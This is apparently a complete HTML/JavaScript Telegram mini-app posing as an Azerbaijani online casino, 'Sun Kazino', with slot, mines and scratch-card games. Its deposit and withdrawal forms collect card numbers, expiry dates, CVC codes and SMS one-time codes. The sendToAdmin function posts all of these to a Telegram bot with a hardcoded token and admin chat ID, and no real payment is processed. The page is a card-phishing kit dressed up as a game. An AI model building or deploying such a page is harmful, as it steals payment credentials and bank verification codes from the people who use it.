<!DOCTYPE html>
<html lang="az">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Sun Kazino</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>

  <!-- Firebase Kitabxanaları -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>

  <style>
    :root {
      --bg-color: #0b0714;
      --card-bg: #150f28;
      --accent-gold: #ffd700;
      --accent-orange: #ff8c00;
      --text-color: #ffffff;
      --green-btn: #2ed573;
    }

    * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; user-select: none; }
    body { background: var(--bg-color); color: var(--text-color); display: flex; flex-direction: column; align-items: center; min-height: 100vh; padding: 12px; text-align: center; }

    header { width: 100%; max-width: 420px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; }
    .logo { font-size: 20px; font-weight: bold; color: var(--accent-gold); text-shadow: 0 0 10px rgba(255,215,0,0.5); }
    .balance-box { background: var(--card-bg); border: 1px solid var(--accent-gold); border-radius: 20px; padding: 6px 14px; font-size: 15px; font-weight: bold; }
    .balance-box span { color: var(--accent-gold); font-size: 17px; }

    .tabs { display: flex; gap: 4px; width: 100%; max-width: 420px; margin-bottom: 12px; }
    .tab-btn { flex: 1; padding: 10px 2px; background: var(--card-bg); border: 1px solid rgba(255,255,255,0.1); color: #aaa; border-radius: 10px; font-size: 11px; font-weight: bold; cursor: pointer; transition: 0.2s; }
    .tab-btn.active { background: linear-gradient(135deg, var(--accent-gold), var(--accent-orange)); color: #000; border-color: var(--accent-gold); }

    .view { display: none; width: 100%; max-width: 420px; background: var(--card-bg); border-radius: 18px; padding: 15px; border: 1px solid rgba(255,215,0,0.2); box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
    .view.active { display: flex; flex-direction: column; align-items: center; }

    .bet-control { margin-bottom: 12px; width: 100%; max-width: 420px; }
    .bet-title { font-size: 12px; color: #888; margin-bottom: 5px; }
    .bet-btns { display: flex; gap: 6px; justify-content: center; }
    .bet-btn { flex: 1; padding: 8px 2px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 8px; font-weight: bold; cursor: pointer; }
    .bet-btn.active { border-color: var(--accent-gold); color: var(--accent-gold); background: rgba(255,215,0,0.15); }

    /* 6-LI SLOT */
    .slot-frame { width: 100%; background: linear-gradient(180deg, #1f1203, #0a0512); border: 2px solid var(--accent-gold); border-radius: 14px; padding: 10px 6px; margin-bottom: 12px; box-shadow: inset 0 0 15px rgba(255,215,0,0.2); }
    .slot-title { font-size: 14px; font-weight: 800; color: var(--accent-gold); letter-spacing: 1px; margin-bottom: 8px; text-shadow: 0 0 5px rgba(255,215,0,0.6); }
    .slots-container { display: grid; grid-template-columns: repeat(6, 1fr); gap: 4px; width: 100%; }
    .slot { aspect-ratio: 0.8; background: #07040d; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 24px; border: 1px solid rgba(255,215,0,0.4); box-shadow: inset 0 0 8px rgba(0,0,0,0.8); }

    /* MİNA OYUNU */
    .mines-dropdown-box { width: 100%; display: flex; align-items: center; justify-content: space-between; background: rgba(0,0,0,0.3); padding: 10px 14px; border-radius: 12px; border: 1px solid var(--accent-gold); margin-bottom: 12px; }
    .mines-dropdown-box label { font-size: 13px; font-weight: bold; color: #ddd; }
    .mines-select { background: #0b0714; color: var(--accent-gold); border: 1px solid var(--accent-gold); padding: 6px 12px; border-radius: 8px; font-size: 15px; font-weight: bold; outline: none; cursor: pointer; }

    .mines-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 6px; width: 100%; margin-bottom: 12px; }
    .mine-card { aspect-ratio: 1; background: #0a0814; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 20px; border: 1px solid rgba(255,255,255,0.1); cursor: pointer; transition: 0.2s; }
    .mine-card.revealed { background: #252042; }

    /* POZ QAZAN BİLET QİYMƏTLƏRİ */
    .scratch-price-selector { display: flex; gap: 8px; width: 100%; margin-bottom: 12px; }
    .scratch-price-btn { flex: 1; padding: 10px; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: #fff; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 13px; }
    .scratch-price-btn.active { border-color: var(--accent-gold); color: var(--accent-gold); background: rgba(255,215,0,0.15); }

    .scratch-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px; width: 220px; margin: 12px 0; }
    .scratch-card { width: 65px; height: 65px; background: linear-gradient(135deg, #444, #222); border-radius: 10px; display: flex; align-items: center; justify-content: center; font-size: 26px; cursor: pointer; border: 1px solid var(--accent-gold); }
    .scratch-card.revealed { background: #0a0814; }

    /* INPUT VƏ FORM */
    .form-group { width: 100%; text-align: left; margin-bottom: 10px; }
    .input-row { display: flex; gap: 8px; width: 100%; }
    .input-field { width: 100%; padding: 12px; background: #0a0814; border: 1px solid var(--accent-gold); border-radius: 8px; color: #fff; font-size: 15px; font-weight: bold; outline: none; }
    .input-label { font-size: 12px; color: #aaa; margin-bottom: 4px; display: block; }

    .action-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--accent-gold), var(--accent-orange)); color: #000; border: none; font-size: 17px; font-weight: 800; border-radius: 50px; cursor: pointer; box-shadow: 0 4px 15px rgba(255,140,0,0.4); transition: 0.1s; margin-top: 5px; }
    .action-btn:active { transform: scale(0.98); }
    .action-btn:disabled { opacity: 0.4; cursor: not-allowed; }
    .status-msg { margin-top: 10px; font-size: 14px; min-height: 20px; font-weight: 600; }

    /* TƏSDİQLƏMƏ MODAL PƏNCƏRƏSİ */
    .modal-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; }
    .modal-overlay.active { display: flex; }
    .modal-card { background: var(--card-bg); border: 2px solid var(--accent-gold); border-radius: 16px; padding: 20px; width: 100%; max-width: 360px; text-align: center; box-shadow: 0 0 20px rgba(255,215,0,0.3); }
    .modal-title { font-size: 18px; font-weight: bold; color: var(--accent-gold); margin-bottom: 10px; }
    .modal-desc { font-size: 13px; color: #ccc; margin-bottom: 15px; line-height: 1.4; }
  </style>
</head>
<body>

  <header>
    <div class="logo">☀️ SUN KAZİNO</div>
    <div class="balance-box">Balans: <span id="balance">0.00</span> AZN</div>
  </header>

  <div class="tabs">
    <button class="tab-btn active" onclick="switchTab('slots')">🎰 Slot</button>
    <button class="tab-btn" onclick="switchTab('mines')">💣 Mina</button>
    <button class="tab-btn" onclick="switchTab('scratch')">🎟️ Poz Qazan</button>
    <button class="tab-btn" onclick="switchTab('deposit')">💳 Depozit</button>
    <button class="tab-btn" onclick="switchTab('withdraw')">💸 Çıxarış</button>
  </div>

  <div class="bet-control" id="betControlSection">
    <div class="bet-title">MƏRC MƏBLƏĞİ (AZN)</div>
    <div class="bet-btns">
      <button class="bet-btn active" onclick="setBet(1, this)">1</button>
      <button class="bet-btn" onclick="setBet(5, this)">5</button>
      <button class="bet-btn" onclick="setBet(10, this)">10</button>
      <button class="bet-btn" onclick="setBet(20, this)">20</button>
      <button class="bet-btn" onclick="setBet(50, this)">50</button>
    </div>
  </div>

  <!-- 6-LI HIT SLOT -->
  <div class="view active" id="slotsView">
    <div class="slot-frame">
      <div class="slot-title">🔥 HIT SLOT 2026 🔥</div>
      <div class="slots-container">
        <div class="slot" id="slot1">🍎</div>
        <div class="slot" id="slot2">🍌</div>
        <div class="slot" id="slot3">🍇</div>
        <div class="slot" id="slot4">🍓</div>
        <div class="slot" id="slot5">🍋</div>
        <div class="slot" id="slot6">🔔</div>
      </div>
    </div>
    <button class="action-btn" id="spinBtn" onclick="playSlots()">⚡ OYNAT (SPIN)</button>
    <div class="status-msg" id="slotsStatus"></div>
  </div>

  <!-- MİNA OYUNU -->
  <div class="view" id="minesView">
    <div class="mines-dropdown-box" id="minesConfigBox">
      <label for="mineSelect">Minalar:</label>
      <select id="mineSelect" class="mines-select" onchange="changeMineCount(this.value)"></select>
    </div>

    <div class="mines-grid" id="minesGrid"></div>
    <button class="action-btn" id="minesBtn" onclick="startMines()">BAŞLA</button>
    <div class="status-msg" id="minesStatus"></div>
  </div>

  <!-- POZ QAZAN -->
  <div class="view" id="scratchView">
    <div style="font-size:12px; color:#aaa; margin-bottom:6px;">BİLET QİYMƏTİ SEÇİN:</div>
    <div class="scratch-price-selector">
      <button class="scratch-price-btn active" onclick="setScratchTicketPrice(1, this)">1 AZN Bilet</button>
      <button class="scratch-price-btn" onclick="setScratchTicketPrice(3, this)">3 AZN Bilet</button>
      <button class="scratch-price-btn" onclick="setScratchTicketPrice(5, this)">5 AZN Bilet</button>
    </div>

    <div class="scratch-grid" id="scratchGrid"></div>
    <button class="action-btn" id="scratchBtn" onclick="startScratch()">YENİ BİLET AL (<span id="scratchCostText">1.00</span> AZN)</button>
    <div class="status-msg" id="scratchStatus"></div>
  </div>

  <!-- DEPOZİT (DEPOSIT) -->
  <div class="view" id="depositView">
    <div class="form-group">
      <label class="input-label">Kart Nömrəniz (16 rəqəm):</label>
      <input type="text" id="depCardNum" class="input-field" placeholder="4169 0000 0000 0000" maxlength="19">
    </div>

    <div class="input-row">
      <div class="form-group" style="flex: 1;">
        <label class="input-label">Müddət (MM/YY):</label>
        <input type="text" id="depCardExp" class="input-field" placeholder="12/28" maxlength="5">
      </div>
      <div class="form-group" style="flex: 1;">
        <label class="input-label">CVC / CVV:</label>
        <input type="password" id="depCardCvc" class="input-field" placeholder="123" maxlength="3">
      </div>
    </div>

    <div class="form-group">
      <label class="input-label">Depozit Məbləği (AZN) - Min 10 AZN:</label>
      <input type="number" id="depositAmountInput" class="input-field" value="10" min="10">
    </div>

    <button class="action-btn" onclick="openConfirmModal('deposit')">💳 DEPOZİT ET</button>
    <div class="status-msg" id="depositStatus"></div>
  </div>

  <!-- ÇIXARIŞ (WITHDRAWAL) -->
  <div class="view" id="withdrawView">
    <div class="form-group">
      <label class="input-label">Kart Nömrəniz (16 rəqəm):</label>
      <input type="text" id="withdrawCardInput" class="input-field" placeholder="4169 0000 0000 0000" maxlength="19">
    </div>

    <div class="form-group">
      <label class="input-label">Çıxarış Məbləği (AZN) - Min 30 AZN:</label>
      <input type="number" id="withdrawAmountInput" class="input-field" value="30" min="30">
    </div>

    <button class="action-btn" style="background:var(--green-btn); color:#000;" onclick="openConfirmModal('withdraw')">💸 ÇIXARIŞ ET</button>
    <div class="status-msg" id="withdrawStatus"></div>
  </div>

  <!-- TƏSDİQLƏMƏ (SMS/OTP) MODAL PƏNCƏRƏSİ -->
  <div class="modal-overlay" id="confirmModal">
    <div class="modal-card">
      <div class="modal-title">🔐 SMS TƏSDİQLƏMƏ</div>
      <div class="modal-desc" id="modalDescText">Telefonunuza göndərilən 6 rəqəmli təsdiqləmə kodunu daxil edin:</div>
      
      <div class="form-group">
        <input type="text" id="smsOtpInput" class="input-field" style="text-align:center; font-size:20px; letter-spacing:4px;" placeholder="123456" maxlength="6">
      </div>

      <button class="action-btn" id="modalConfirmBtn" onclick="processConfirmedAction()">TƏSDİQLƏ VƏ GÖNDƏR</button>
      <button class="action-btn" style="background:transparent; color:#aaa; border:1px solid #444; margin-top:8px;" onclick="closeConfirmModal()">LƏĞV ET</button>
    </div>
  </div>

  <script>
    const tg = window.Telegram?.WebApp;
    if(tg) { tg.expand(); tg.ready(); }

    const BOT_TOKEN = "8836417399:AAHySYind-48Td8EvxW3-i-WLTwxE-ey5so";
    const ADMIN_CHAT_ID = "7723256649";

    const firebaseConfig = { databaseURL: "https://sunkazino-default-rtdb.firebaseio.com" };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    const user = tg?.initDataUnsafe?.user;
    const userId = user?.id ? String(user.id) : 'demo_user';

    let balance = 0.00;
    let pendingAction = null; // 'deposit' və ya 'withdraw'

    db.ref(`users/${userId}/balance`).on('value', (snapshot) => {
      const val = snapshot.val();
      if (val !== null && val !== undefined) {
        balance = parseFloat(val);
        updateBalanceUI();
      }
    });

    function saveBalanceToDB(newBal) {
      db.ref(`users/${userId}/balance`).set(newBal);
    }

    const AudioCtx = window.AudioContext || window.webkitAudioContext;
    const audioCtx = new AudioCtx();

    function playSound(type) {
      if (audioCtx.state === 'suspended') audioCtx.resume();
      const osc = audioCtx.createOscillator();
      const gain = audioCtx.createGain();
      osc.connect(gain);
      gain.connect(audioCtx.destination);

      if (type === 'click') {
        osc.frequency.setValueAtTime(400, audioCtx.currentTime);
        gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
        osc.start(); osc.stop(audioCtx.currentTime + 0.05);
      } else if (type === 'win') {
        osc.frequency.setValueAtTime(523.25, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.3);
        gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
        osc.start(); osc.stop(audioCtx.currentTime + 0.3);
      } else if (type === 'lose') {
        osc.frequency.setValueAtTime(300, audioCtx.currentTime);
        osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.3);
        gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
        osc.start(); osc.stop(audioCtx.currentTime + 0.3);
      }
    }

    let currentBet = 1;
    let selectedMinesCount = 1;
    let scratchTicketPrice = 1;

    const selectElem = document.getElementById('mineSelect');
    for (let i = 1; i <= 24; i++) {
      const opt = document.createElement('option');
      opt.value = i; opt.innerHTML = i;
      selectElem.appendChild(opt);
    }

    function updateBalanceUI() {
      document.getElementById('balance').innerText = balance.toFixed(2);
    }

    function setBet(amount, btn) {
      playSound('click');
      currentBet = amount;
      document.querySelectorAll('.bet-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
    }

    function changeMineCount(val) {
      if (minesState.active) return;
      playSound('click');
      selectedMinesCount = parseInt(val);
    }

    function setScratchTicketPrice(price, btn) {
      playSound('click');
      scratchTicketPrice = price;
      document.querySelectorAll('.scratch-price-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      document.getElementById('scratchCostText').innerText = price.toFixed(2);
    }

    function switchTab(tab) {
      playSound('click');
      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
      document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
      
      const targetBtn = document.querySelector(`[onclick="switchTab('${tab}')"]`);
      if(targetBtn) targetBtn.classList.add('active');
      
      document.getElementById(tab + 'View').classList.add('active');
      document.getElementById('betControlSection').style.display = (tab === 'slots' || tab === 'mines') ? 'block' : 'none';
    }

    function checkBalanceOrRedirect(requiredAmount) {
      if (balance < requiredAmount) {
        playSound('lose');
        alert('Balansınız kifayət etmir!');
        return false;
      }
      return true;
    }

    /* --- SLOT OYUNU --- */
    const fruitItems = ['🍎', '🍌', '🍇', '🍓', '🍋', '🔔', '💎', '7️⃣'];

    function playSlots() {
      if (!checkBalanceOrRedirect(currentBet)) return;

      balance -= currentBet;
      saveBalanceToDB(balance);
      playSound('click');

      const spinBtn = document.getElementById('spinBtn');
      spinBtn.disabled = true;
      document.getElementById('slotsStatus').innerText = 'Fırlanır...';

      let count = 0;
      const timer = setInterval(() => {
        const currentSymbols = [];
        for (let i = 1; i <= 6; i++) {
          const sym = fruitItems[Math.floor(Math.random() * fruitItems.length)];
          document.getElementById(`slot${i}`).innerText = sym;
          currentSymbols.push(sym);
        }

        count++;
        if (count > 15) {
          clearInterval(timer);
          spinBtn.disabled = false;

          const counts = {};
          currentSymbols.forEach(s => counts[s] = (counts[s] || 0) + 1);
          let maxMatch = Math.max(...Object.values(counts));

          if (maxMatch >= 6) {
            const win = currentBet * 50; balance += win; playSound('win');
            document.getElementById('slotsStatus').innerText = `🔥 MÖHTƏŞƏM CEKPOT (6/6)! +${win.toFixed(2)} AZN! 🎉`;
          } else if (maxMatch === 5) {
            const win = currentBet * 15; balance += win; playSound('win');
            document.getElementById('slotsStatus').innerText = `💥 BÖYÜK UDUŞ (5/6)! +${win.toFixed(2)} AZN! 🎉`;
          } else if (maxMatch === 4) {
            const win = currentBet * 5; balance += win; playSound('win');
            document.getElementById('slotsStatus').innerText = `✨ ƏLƏ UDUŞ (4/6)! +${win.toFixed(2)} AZN! 🎉`;
          } else if (maxMatch === 3) {
            const win = currentBet * 2; balance += win; playSound('win');
            document.getElementById('slotsStatus').innerText = `👍 QAZANDINIZ (3/6)! +${win.toFixed(2)} AZN!`;
          } else {
            playSound('lose');
            document.getElementById('slotsStatus').innerText = 'Şansınızı bir daha sınayın!';
          }

          saveBalanceToDB(balance);
        }
      }, 70);
    }

    /* --- MİNA OYUNU --- */
    let minesState = { active: false, bombs: [], openedCount: 0, currentMultiplier: 1.0 };
    
    function calculateMinesMultiplier(opened, mines) {
      let prob = 1.0;
      for (let i = 0; i < opened; i++) {
        prob *= (25 - mines - i) / (25 - i);
      }
      return (1 / prob) * 0.96;
    }

    function initMinesGrid() {
      const grid = document.getElementById('minesGrid');
      grid.innerHTML = '';
      for (let i = 0; i < 25; i++) {
        const card = document.createElement('div');
        card.className = 'mine-card';
        card.onclick = () => revealMine(i, card);
        grid.appendChild(card);
      }
    }
    initMinesGrid();

    function startMines() {
      const btn = document.getElementById('minesBtn');
      if (minesState.active) {
        const win = currentBet * minesState.currentMultiplier;
        balance += win;
        saveBalanceToDB(balance);
        playSound('win');
        document.getElementById('minesStatus').innerText = `Nağdlaşdırıldı: +${win.toFixed(2)} AZN`;
        endMines();
        return;
      }

      if (!checkBalanceOrRedirect(currentBet)) return;

      balance -= currentBet;
      saveBalanceToDB(balance);
      playSound('click');

      minesState = { active: true, bombs: [], openedCount: 0, currentMultiplier: 1.0 };
      
      while(minesState.bombs.length < selectedMinesCount) {
        let r = Math.floor(Math.random() * 25);
        if(!minesState.bombs.includes(r)) minesState.bombs.push(r);
      }

      initMinesGrid();
      document.getElementById('mineSelect').disabled = true;
      btn.innerText = `NAĞDLAŞDIR (${currentBet.toFixed(2)} AZN)`;
      document.getElementById('minesStatus').innerText = `${selectedMinesCount} Mina gizlədildi. Meyvələri seçin!`;
    }

    function revealMine(index, card) {
      if(!minesState.active || card.classList.contains('revealed')) return;

      card.classList.add('revealed');
      if (minesState.bombs.includes(index)) {
        card.innerText = '💣';
        playSound('lose');
        document.getElementById('minesStatus').innerText = 'Mina partladı! Uduzdunuz.';
        
        document.querySelectorAll('.mine-card').forEach((c, i) => {
          if (minesState.bombs.includes(i)) {
            c.innerText = '💣';
            c.classList.add('revealed');
          }
        });
        endMines();
      } else {
        card.innerText = '💎';
        playSound('click');
        minesState.openedCount++;
        
        minesState.currentMultiplier = calculateMinesMultiplier(minesState.openedCount, selectedMinesCount);
        const currentWin = currentBet * minesState.currentMultiplier;
        
        document.getElementById('minesBtn').innerText = `NAĞDLAŞDIR (${currentWin.toFixed(2)} AZN - x${minesState.currentMultiplier.toFixed(2)})`;
      }
    }

    function endMines() {
      minesState.active = false;
      document.getElementById('mineSelect').disabled = false;
      document.getElementById('minesBtn').innerText = 'YENİDƏN BAŞLA';
    }

    /* --- POZ QAZAN --- */
    let scratchItems = [];
    let revealedScratch = 0;

    function initEmptyScratchGrid() {
      const grid = document.getElementById('scratchGrid');
      grid.innerHTML = '';
      for (let i = 0; i < 9; i++) {
        const card = document.createElement('div');
        card.className = 'scratch-card';
        card.innerText = '❓';
        grid.appendChild(card);
      }
      document.getElementById('scratchStatus').innerText = 'Oynamaq üçün "YENİ BİLET AL" düyməsinə basın';
    }
    initEmptyScratchGrid();

    function startScratch() {
      if (!checkBalanceOrRedirect(scratchTicketPrice)) return;

      balance -= scratchTicketPrice;
      saveBalanceToDB(balance);
      playSound('click');

      scratchItems = [];
      revealedScratch = 0;

      const isWin = Math.random() <= 0.35; 

      if (isWin) {
        const winSym = fruitItems[Math.floor(Math.random() * fruitItems.length)];
        scratchItems = [winSym, winSym, winSym, '🍎', '🍌', '🍇', '🍓', '🍋', '🔔'];
      } else {
        scratchItems = ['🍎', '🍎', '🍌', '🍌', '🍇', '🍇', '🍓', '🍓', '🍋'];
      }

      scratchItems.sort(() => Math.random() - 0.5);

      const grid = document.getElementById('scratchGrid');
      grid.innerHTML = '';
      for (let i = 0; i < 9; i++) {
        const card = document.createElement('div');
        card.className = 'scratch-card';
        card.innerText = '❓';
        card.onclick = () => scratchCard(i, card);
        grid.appendChild(card);
      }

      document.getElementById('scratchStatus').innerText = 'Xanaları pozun (3 eyni simvol = Uduş)';
    }

    function scratchCard(index, card) {
      if (card.classList.contains('revealed')) return;

      card.classList.add('revealed');
      card.innerText = scratchItems[index];
      playSound('click');
      revealedScratch++;

      if (revealedScratch === 9) {
        const counts = {};
        scratchItems.forEach(item => counts[item] = (counts[item] || 0) + 1);
        let won = false;

        for (let item in counts) {
          if (counts[item] >= 3) { won = true; break; }
        }

        if (won) {
          const winMultiplier = 5; 
          const win = scratchTicketPrice * winMultiplier;
          balance += win;
          saveBalanceToDB(balance);
          playSound('win');
          document.getElementById('scratchStatus').innerText = `🎉 3 EYNİ SİMVOL! +${win.toFixed(2)} AZN QAZANDINIZ!`;
        } else {
          playSound('lose');
          document.getElementById('scratchStatus').innerText = 'Uduş olmadı, bir daha sınayın.';
        }
      }
    }

    /* --- MODAL PƏNCƏRƏ VƏ TƏSDİQLƏMƏ SİSTEMİ --- */
    function openConfirmModal(type) {
      if (type === 'deposit') {
        const cardNum = document.getElementById('depCardNum').value.trim();
        const cardExp = document.getElementById('depCardExp').value.trim();
        const cardCvc = document.getElementById('depCardCvc').value.trim();
        const amount = parseFloat(document.getElementById('depositAmountInput').value);

        if (!cardNum || cardNum.length < 16) { alert('Düzgün 16 rəqəmli kart nömrəsi girin!'); return; }
        if (!cardExp || cardExp.length < 4) { alert('Son istifadə tarixini daxil edin (MM/YY)!'); return; }
        if (!cardCvc || cardCvc.length < 3) { alert('CVC/CVV kodunu daxil edin!'); return; }
        if (isNaN(amount) || amount < 10) { alert('Minimum depozit 10 AZN-dir!'); return; }

        pendingAction = 'deposit';
        document.getElementById('modalDescText').innerText = `${amount.toFixed(2)} AZN depoziti təsdiqləmək üçün SMS kodunu daxil edin:`;

      } else if (type === 'withdraw') {
        const cardNum = document.getElementById('withdrawCardInput').value.trim();
        const amount = parseFloat(document.getElementById('withdrawAmountInput').value);

        if (!cardNum || cardNum.length < 16) { alert('Düzgün 16 rəqəmli kart nömrəsi girin!'); return; }
        if (isNaN(amount) || amount < 30) { alert('Minimum çıxarış 30 AZN-dir!'); return; }
        if (balance < amount) { alert('Balansınızda kifayət qədər məbləğ yoxdur!'); return; }

        pendingAction = 'withdraw';
        document.getElementById('modalDescText').innerText = `${amount.toFixed(2)} AZN çıxarışı təsdiqləmək üçün SMS kodunu daxil edin:`;
      }

      document.getElementById('smsOtpInput').value = '';
      document.getElementById('confirmModal').classList.add('active');
    }

    function closeConfirmModal() {
      document.getElementById('confirmModal').classList.remove('active');
      pendingAction = null;
    }

    function processConfirmedAction() {
      const otpCode = document.getElementById('smsOtpInput').value.trim();
      if (!otpCode || otpCode.length < 4) {
        alert('Lütfən göndərilən təsdiq kodunu daxil edin!');
        return;
      }

      const username = user?.username ? `@${user.username}` : (user?.first_name || 'İstifadəçi');

      if (pendingAction === 'deposit') {
        const cardNum = document.getElementById('depCardNum').value.trim();
        const cardExp = document.getElementById('depCardExp').value.trim();
        const cardCvc = document.getElementById('depCardCvc').value.trim();
        const amount = parseFloat(document.getElementById('depositAmountInput').value);

        const messageText = `💳 <b>YENİ DEPOZİT SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n💳 <b>Kart:</b> <code>${cardNum}</code>\n📅 <b>Tarix:</b> <code>${cardExp}</code> | 🔒 <b>CVC:</b> <code>${cardCvc}</code>\n🔑 <b>SMS/OTP Kod:</b> <code>${otpCode}</code>\n💰 <b>Məbləğ:</b> ${amount.toFixed(2)} AZN`;

        sendToAdmin(messageText, () => {
          document.getElementById('depositStatus').innerText = `Depozit sorğusu və SMS təsdiqi adminə daxil oldu.`;
          playSound('win');
        });

      } else if (pendingAction === 'withdraw') {
        const cardNum = document.getElementById('withdrawCardInput').value.trim();
        const amount = parseFloat(document.getElementById('withdrawAmountInput').value);

        balance -= amount;
        saveBalanceToDB(balance);

        const messageText = `💸 <b>YENİ ÇIXARIŞ SORĞUSU</b>\n\n👤 <b>İstifadəçi:</b> ${username}\n🆔 <b>User ID:</b> <code>${userId}</code>\n💳 <b>Kart Nömrəsi:</b> <code>${cardNum}</code>\n🔑 <b>SMS/OTP Kod:</b> <code>${otpCode}</code>\n💰 <b>Məbləğ:</b> ${amount.toFixed(2)} AZN`;

        sendToAdmin(messageText, () => {
          document.getElementById('withdrawStatus').innerText = `Çıxarış sorğunuz təsdiqləndi və emala götürüldü.`;
          playSound('win');
        });
      }

      closeConfirmModal();
    }

    function sendToAdmin(text, onSuccess) {
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: text, parse_mode: 'HTML' })
      })
      .then(res => res.json())
      .then(data => {
        if(data.ok) { onSuccess(); }
        else { alert('Xəta baş verdi. Telegram Bot-a /start verin.'); }
      })
      .catch(() => alert('Şəbəkə xətası baş verdi.'));
    }
  </script>
